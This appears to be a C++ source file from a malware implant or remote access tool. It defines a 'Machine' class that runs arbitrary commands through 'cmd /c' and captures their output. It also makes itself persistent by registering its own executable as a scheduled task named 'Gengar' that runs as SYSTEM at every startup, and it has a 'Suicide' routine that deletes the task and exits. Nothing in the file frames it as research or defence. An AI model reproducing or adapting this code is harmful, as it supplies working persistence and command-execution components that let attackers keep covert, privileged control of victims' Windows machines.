#include <iostream>
#include <sstream>
#include <boost/process.hpp>
#include "machine.h"

namespace bp = boost::process;
const std::string TASK_NAME = "Gengar";

std::string quotify(std::string str)
{
	return '"' + str + '"';
}

void ReadStream(bp::ipstream& stream, std::string& output)
{
	std::string buff;
	while (std::getline(stream, buff))
	{
		if (buff.back() == '\r')
			buff.pop_back();
		buff.push_back('\n');
		output.append(buff);
	}
}

std::string Machine::RunShellCommand(std::string&& cmd)
{
	std::string output;
	bp::ipstream out_stream, err_stream;

	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream);
	ReadStream(out_stream, output);
	ReadStream(err_stream, output);
	return output;
}

void Machine::Persist()
{
	std::ostringstream cmd;
	const short buff_size = 128;
	char exe_path[buff_size];

	GetModuleFileNameA(nullptr, exe_path, buff_size);
	cmd << "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " << quotify(TASK_NAME) << " /TR " << quotify(exe_path);
	RunShellCommand(std::move(cmd.str()));
}

void Machine::Suicide()
{
	RunShellCommand(std::move("schtasks /Delete /F /TN " + TASK_NAME));
	std::exit(0);
}
